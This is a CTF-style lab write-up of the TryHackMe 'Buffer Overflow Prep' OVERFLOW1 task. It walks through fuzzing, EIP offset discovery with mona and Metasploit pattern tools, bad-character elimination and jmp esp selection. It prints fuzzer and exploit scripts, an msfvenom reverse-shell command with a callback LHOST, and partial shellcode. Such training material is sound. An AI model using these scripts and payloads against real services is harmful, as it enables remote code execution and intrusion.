<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Buffer Overflow Using ID & mona</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Buffer Overflow Using ID & mona</h1><br/><strong><span style="text-decoration:underline;">THM Room: Buffer Overflow Prep </span></strong><strong><br /><br />oscp.exe OVERFLOW 1 (Task-2)</strong><br /><br /><br /><br /><br /><strong><span style="text-decoration:underline;">Buffer overflow using Immunity Debugger and Mona</span></strong><br /><br />What is mona.py?<br /><br />Mona.py is a python script that can be used to automate and speed up specific searches while developing exploits (typically for the Windows platform). It runs on Immunity Debugger and WinDBG, and requires python 2.7. Although it runs in WinDBG x64, the majority of its features were written specifically for 32bit processes.<br /><br /><em><strong>https://github.com/corelan/mona</strong></em><br /><br />Download mona.py and paste into C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands<br /><br />Note: The immunity debugger has a command line at the bottom of the screen. Run the following command there to configure the mona script.<br /><br /><em><strong>!mona config -set workingfolder c:\mona\%p</strong></em><br /><br />The above command will configute mona and create a working directory in C:\mona <br /><br /><br />Next, run the vulnerable program. oscp.exe in the Immunity Debugger opened as Administrator<br /><br />Once the program is loaded(It loads in paused state). Hit the <strong>red play button</strong> or <strong>Debug --→ Run(F9)</strong> to run the program.<br />Once it runs we will get the following cmd window. <strong>(Waiting for client Connection)</strong><br /><br /><a href=""><img src="images/132-1.png" alt="images/132-1.png" /></a><br /><br />We can connect to the vulnerable server using netcat to run as a normal user first.<br /><br /><em><strong>nc 11.11.11.123 1337</strong></em><br /><br /><a href=""><img src="images/132-2.png" alt="images/132-2.png" /></a><br /><br />We run the <strong>HELP</strong> command.<br />Then we will use the first mode for this exercise.<br /><br />So we test it.<br /><br /><strong>OVERFLOW1 userinput</strong><br /><br /><br />Now thats working we can proceed with the exercise.<br /><br /><strong>Fuzzing</strong><br /><strong>Fuzzer.py</strong><br />#!/usr/bin/env python3<br /><br />import socket, time, sys<br /><br />ip = &quot;11.11.11.123&quot;<br /><br />port = 1337<br />timeout = 5<br />prefix = &quot;OVERFLOW1 &quot;<br /><br />string = prefix + &quot;A&quot; * 100<br /><br />while True:<br />  try:<br />    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:<br />      s.settimeout(timeout)<br />      s.connect((ip, port))<br />      s.recv(1024)<br />      print(&quot;Fuzzing with {} bytes&quot;.format(len(string) - len(prefix)))<br />      s.send(bytes(string, &quot;latin-1&quot;))<br />      s.recv(1024)<br />  except:<br />    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix)))<br />    sys.exit(0)<br />  string += 100 * &quot;A&quot;<br />  time.sleep(1)<br />    <br />The Fuzzer app will send random bytes to the prgram incrementing by 100. eg 100,200,300..and so on till the program crashes.<br />This will help us to identify the <strong>range</strong> where the <strong>offset</strong> is present.<br /><br /><strong>Note:</strong> The <strong>prefix</strong> makes sure our input is in the format “OVERFLOW1 AAAA.....”<br />As we did when we tested manually. (This will correspond to exercise 1)<br /><br /><a href=""><img src="images/132-3.png" alt="images/132-3.png" /></a><br /><br />The fuzzer will crash the program at <strong>2000</strong> bytes indicating that <strong>offset</strong> is between 1900-2000.<br /><br /><a href=""><img src="images/132-4.png" alt="images/132-4.png" /></a><br /><br />We can see the highlighted EIP or Extended Insteuction Pointer having all As ie. 41414141<br />Now we need to find the exact point of <strong>offset</strong>.<br /><br /><strong>Crash Replication &amp; Controlling EIP</strong><br /><strong>Exploit.py</strong><br /><h3>import socket<br /><br />ip = &quot;11.11.11.123&quot;<br />port = 1337<br /><br />prefix = &quot;OVERFLOW1 &quot;<br />offset = 0<br />overflow = &quot;A&quot; * offset<br />retn = &quot;&quot;<br />padding = &quot;&quot;<br />payload = &quot;&quot;<br />postfix = &quot;&quot;<br /><br />buffer = prefix + overflow + retn + padding + payload + postfix<br /><br />s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br /><br />try:<br />  s.connect((ip, port))<br />  print(&quot;Sending evil buffer...&quot;)<br />  s.send(bytes(buffer + &quot;\r\n&quot;, &quot;latin-1&quot;))<br />  print(&quot;Done!&quot;)<br />except:<br />  print(&quot;Could not connect.&quot;)</h3><br />  <br />  <br />Once this above program is ready. Run the following command to generate a cyclic pattern of a length around 400 bytes longer that the string that crashed the server (change the -l value to this):<br /><br /><strong>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400</strong><br /><br />Copy the output and place it into the <strong>payload</strong> variable of the exploit.py script.<br /><br />On  Windows, in Immunity Debugger, re-open the oscp.exe again using the  same method as before, and click the red play icon to get it running.  You will have to do this prior to each time we run the exploit.py (which  we will run multiple times with incremental modifications).<br /><br /><br /><a href=""><img src="images/132-5.png" alt="images/132-5.png" /></a><br /><br />Run the program again and run exploit.py in our kali machine.<br /><br /><a href=""><img src="images/132-6.png" alt="images/132-6.png" /></a><br /><br />This will crash the program again.<br /><br />We will again check the EIP value and store it.<br /><br /><a href=""><img src="images/132-7.png" alt="images/132-7.png" /></a><br /><br /><strong>EIP Value: 6F43396E</strong><br /><br /><strong>Finding the exact offset value:</strong><br /><br /><strong>Method-1</strong><br />Using metasploit tool as we used in gdb<br /><br /><em><strong>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2400 -q 6F43396E</strong></em><br /><br /><a href=""><img src="images/132-8.png" alt="images/132-8.png" /></a><br /><br />Thus offset value is <strong>1978</strong><br /><br /><strong>Method-2</strong><br />Using mona commands<br /><br /><em><strong>!mona findmsp -distance 2400</strong></em><br /><br />Run the above in Immunity debugger terminal after running the exploit. The program should remain in crashed state.<br />Look for a string: &quot;<em>EIP Contains normal pattern..</em>&quot;<br /><br /><a href=""><img src="images/132-9.png" alt="images/132-9.png" /></a><br /><br />Thus offset value is <strong>1978</strong><br /><br />Update your exploit.py script and set the <strong>offset</strong> variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the <strong>retn</strong> variable to &quot;<strong>BBBB</strong>&quot;.<br /><br />Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B&#39;s (e.g. 42424242).<br /><br /><a href=""><img src="images/132-10.png" alt="images/132-10.png" /></a><br /><br /><strong>Finding Badchars</strong><br /><br />Now  we need to find the BADCHARS- For which we create BADCHARS, on set  inside the machine using MONA and another by just googling or using a  python script.By default \x00 is considered as a BADCHAR so it is to be  neglected for sure. This helps us to identify the characters which are  really BAD for our program!<br /><br />Generate a bytearray using mona, and exclude the null byte (\x00) by default.<br />Use this mona commands.<br /><br /><em><strong>!mona bytearray -b &quot;\x00&quot;</strong></em><br /><br /><a href=""><img src="images/132-11.png" alt="images/132-11.png" /></a><br /><br />Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:<br /><br /><strong>Badchar.py</strong><br />for x in range(1, 256):<br />  print(&quot;\\x&quot; + &quot;{:02x}&quot;.format(x), end=&#39;&#39;)<br />print()<br /><br /><a href=""><img src="images/132-12.png" alt="images/132-12.png" /></a><br /><br /><br />Update your exploit.py script and set the payload variable to the string of bad chars the script generates.<br /><br /><a href=""><img src="images/132-13.png" alt="images/132-13.png" /></a><br /><br />Restart oscp.exe in Immunity and run the modified exploit.py script again. <br /><br />Right click on ESP Value and Follow in dump<br /><a href=""><img src="images/132-14.png" alt="images/132-14.png" /></a><br />In the above image the sequence has been changed after 06,2D that means there are some badchar in over payload lets find out badchars<br /><br /><br />Make a note of the address to which the <strong>ESP register</strong> points and use it in the following mona command:<br /><br /><em><strong>!mona compare -f C:\mona\oscp\bytearray.bin -a 00C9FA18</strong></em><br /><br /><br /><br /><a href=""><img src="images/132-15.png" alt="images/132-15.png" /></a><br /><br />Possible bad chars<br />So we found a list of possible bad chars <strong>07 08 2e 2f a0 a1</strong><br /><br />Not all of these might be bad chars! Sometimes bad chars cause the <strong>next byte</strong> to get corrupted as well, or even affect the rest of the string.<br />At this point I start removing the bad characters one at a time. I removed  one bad character at a time by repeating the following steps:<br />• Remove character from byte array<br />• Remove character from exploit payload<br />• Start exe<br />• Compare using mona<br /><br /><strong>Example:</strong> <br />Start with <strong>!mona bytearray -b &quot;\x00\x07&quot;</strong>  and remove <strong>\x07</strong> from our payload. Then <strong>restart</strong> the program, <strong>run</strong> the exploit and do the <strong>comparsion</strong> again with the new <strong>ESP register</strong>.<br /><em><strong>!mona compare -f C:\mona\oscp\bytearray.bin -a 00FAFA18</strong></em><br /><br /><a href=""><img src="images/132-16.png" alt="images/132-16.png" /></a><br /><br />After removing x00 and x07<br />Now possible bad chars show: 2e 2f a0 a1<br /><br />We continue the process.<br />Start with <strong>!mona bytearray -b &quot;\x00\x07\x2e&quot;</strong>  and remove <strong>\x2e</strong> from our payload. Then <strong>restart</strong> the program, <strong>run</strong> the exploit and do the <strong>comparsion</strong> again with the new <strong>ESP register</strong>.<br /><em><strong>!mona compare -f C:\mona\oscp\bytearray.bin -a 00FBFA18</strong></em><br /> <br /><a href=""><img src="images/132-17.png" alt="images/132-17.png" /></a><br /><br />After removing x00, x07 and x2e<br />Now possible bad chars show: a0 a1<br /><br />We continue the process.<br />Start with <strong>!mona bytearray -b &quot;\x00\x07\x2e\xa0&quot;</strong>  and remove <strong>\xa0</strong> from our payload. Then <strong>restart</strong> the program, <strong>run</strong> the exploit and do the <strong>comparsion</strong> again with the new <strong>ESP register</strong>.<br /><em><strong>!mona compare -f C:\mona\oscp\bytearray.bin -a </strong></em><strong>00FBFA18</strong><br /><br /><a href=""><img src="images/132-18.png" alt="images/132-18.png" /></a><br />Once we get the status of <strong>Unmodified</strong> we confirm that all badchars were removed.<br />We see the <strong>“Hooray normal shellcode unmodified”</strong> to confirm this.<br /><br />The badchars which we found were: <strong>x00, x07, x2e and xa0</strong><br /><br /><strong>Finding a Jump Point</strong><br /><br />With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):<br /><br /><strong>!mona jmp -r esp -cpb &quot;\x00\x07\x2e\xa0&quot;</strong><br /><br />This command finds all &quot;jmp esp&quot; (or equivalent) instructions with addresses that don&#39;t contain any of the badchars specified. The results should display in the &quot;Log data&quot; window (use the Window menu to switch to it if needed).<br /><br />Choose <strong>any one</strong> address and update your exploit.py script, setting the &quot;<strong>retn</strong>&quot; variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.<br /><br /><a href=""><img src="images/132-19.png" alt="images/132-19.png" /></a><br /><br />We can choose any 1 for our return address.<br />Lets take the first one: 0x625011AF<br /><br />In Little endian it would be: <strong>\xaf\x11\x50\x62</strong><br />Fill the above in <strong>retn</strong> value of exploit.py<br /><br /><br /><strong>Generate Payload</strong><br /><br />Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):<br /><br /><em><strong>msfvenom -p windows/shell_reverse_tcp LHOST=11.11.11.100 LPORT=7777 EXITFUNC=thread -b &quot;\x00\x07\x2e\xa0&quot; -f c</strong></em><br /><br /><a href=""><img src="images/132-20.png" alt="images/132-20.png" /></a><br />Copy the generated C code strings and integrate them into your exploit.py script <strong>payload</strong> variable using the following notation:<br /><br />payload = (&quot;\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3&quot;<br />&quot;\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d&quot;<br />...<br />&quot;\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6&quot;<br />&quot;\x19\x53\xd0\x92\x19\x53\x2e\x1d&quot;)<br /><br />I.E. Create a parenthesis <strong>()</strong> after <strong>payload =</strong> and copy everything inside it, excluding the <strong>;</strong><br /><strong>Note:</strong> I will show the final exploit before exploiting.<br /><br /><strong>Prepend NOPs</strong><br /><br />Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the <strong>padding</strong> variable to a string of 16 or more &quot;No Operation&quot; (\x90) bytes:<br /><br />padding = &quot;\x90&quot; * 16 <br /><br /><strong>Final Exploit Option Snap:</strong><br /><br /><a href=""><img src="images/132-21.png" alt="images/132-21.png" /></a><br /><br /><strong>Exploit!</strong><br /><br />With the correct <strong>prefix</strong>, <strong>offset</strong>, <strong>return address</strong>, <strong>padding</strong>, and <strong>payload</strong> set, you can now exploit the buffer overflow to get a reverse shell.<br />Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command<br /><br />Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!<br /><br /><a href=""><img src="images/132-22.png" alt="images/132-22.png" /></a><br /><br />Thus, we successfully exploited the buffer overflow.<br /></div>
</body>
</html>
